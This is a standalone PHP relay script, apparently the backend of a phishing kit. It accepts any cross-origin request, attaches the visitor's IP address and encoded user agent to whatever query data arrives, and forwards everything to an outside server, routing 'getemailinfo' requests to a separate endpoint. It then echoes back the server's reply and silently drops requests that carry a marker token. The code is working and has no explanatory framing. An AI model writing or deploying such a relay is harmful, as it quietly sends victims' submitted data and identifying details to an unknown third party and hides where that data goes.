<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE');
header('Access-Control-Allow-Headers: Origin, Content-Type, Accept, Authorization, X-Request-With');
header('Content-Type: application/json; charset=utf-8');

$ip = $_SERVER['REMOTE_ADDR'];
          
            
$agent = base64_encode($_SERVER['HTTP_USER_AGENT']);

$querystring_data =  $_SERVER['QUERY_STRING'];

if(strpos($querystring_data, '30kpamukoxxxv') !== false) {
    
    //sleep(50);
    exit();
}

$querystring;

$querystring .=  $querystring_data;

$querystring .=  "&ip=$ip";

$querystring .=  "&agent=$agent";

if (strpos($querystring, 'getemailinfo') !== false) { 

$url = "https://nss.momoonly.online/apizero_error.php?$querystring";  
$ch = curl_init();   
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   
curl_setopt($ch, CURLOPT_URL, $url);   
$jsonData = curl_exec($ch); 
curl_close($ch); 

}else{
    
$url = "https://nss.momoonly.online/apizero.php?$querystring";  
$ch = curl_init();   
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   
curl_setopt($ch, CURLOPT_URL, $url);   
$jsonData = curl_exec($ch); 
curl_close($ch); 
}

echo $jsonData;

?>
